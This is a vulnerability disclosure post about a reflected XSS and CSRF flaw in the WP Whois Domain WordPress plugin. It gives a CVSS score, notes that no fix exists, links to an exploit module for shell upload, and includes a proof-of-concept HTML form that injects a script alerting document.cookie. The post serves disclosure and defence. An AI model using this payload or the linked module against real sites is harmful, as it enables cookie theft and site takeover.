---
layout: single
title: WP Whois Domain Reflected XSS
date: 2017-01-14
categories:
  - security
  - websec
  - disclosure
tags:
  - wordpress
  - wp-whois-domain
  - reflected xss
excerpt: Due to a lack of CSRF mitigation and entity encoding in `pages/func-whois.php`, it is possible to execute scripts in the context of an admin user by including a script in the `domain` field, via the query string or a POST field.
---
## Homepage
[https://wordpress.org/plugins/wp-whois-domain/](https://wordpress.org/plugins/wp-whois-domain/)

## Overview
Due to a lack of CSRF mitigation and entity encoding in `pages/func-whois.php`, it is possible to execute scripts in the context of an admin user by including a script in the `domain` field, via the query string or a POST field.

## CVSS Score
5.5

## CVSS Vector
[(AV:N/AC:M/Au:N/C:P/I:P/A:N/E:F/RL:U/RC:C)](https://nvd.nist.gov/cvss.cfm?calculator&version=2&vector=(AV:N/AC:M/Au:N/C:P/I:P/A:N/E:F/RL:U/RC:C))

## Versions Affected
All versions

## Solution
There is currently no official fix, the plugin has been removed from the WordPress plugin repository until the vendor provides a solution.

## WordPress Exploit Framework Module
[exploit/xss/reflected/wp\_whois\_domain\_reflected\_xss\_shell\_upload](https://github.com/rastating/wordpress-exploit-framework/blob/development/modules/exploit/xss/reflected/wp_whois_domain_reflected_xss_shell_upload.rb)

## Proof of Concept
```xml
<form action="[url of page with the whois form]" method="post">
  <input type="hidden" name="domain" value="&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;">
  <input type="submit" value="Submit">
</form>
```

## WPVDB-ID
[8683](https://wpvulndb.com/vulnerabilities/8683)
